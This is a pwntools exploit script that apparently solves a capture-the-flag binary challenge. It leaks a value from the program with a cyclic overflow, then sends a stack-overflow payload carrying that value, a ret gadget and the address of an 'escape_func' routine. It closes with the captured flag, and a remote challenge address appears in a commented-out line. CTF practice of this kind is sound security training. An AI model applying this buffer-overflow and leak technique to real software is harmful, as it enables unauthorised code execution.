from pwn import *
context.binary = './chal'
p = process()
#p = remote("34.70.212.151",8005)
script = """
b*main+133
"""
#gdb.attach(p)
escape_func = 0x000000000040157f
ret = 0x000000000040101a
p.recv()
p.sendline(cyclic(0x47)+b'T')
print(p.recvuntil(b'T'))
leak = u64(p.recv(8))-0xa
print(hex(leak))
payload = cyclic(0x48)+p64(leak)+b'A'*8+p64(ret)+p64(escape_func)
print(p.recv())
p.sendline(payload)
#leak = u64(p.recvuntil(b' is').strip(b' is').ljust(8,b'\x00'))
#print(hex(leak))
p.interactive()

#Flag: flag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}
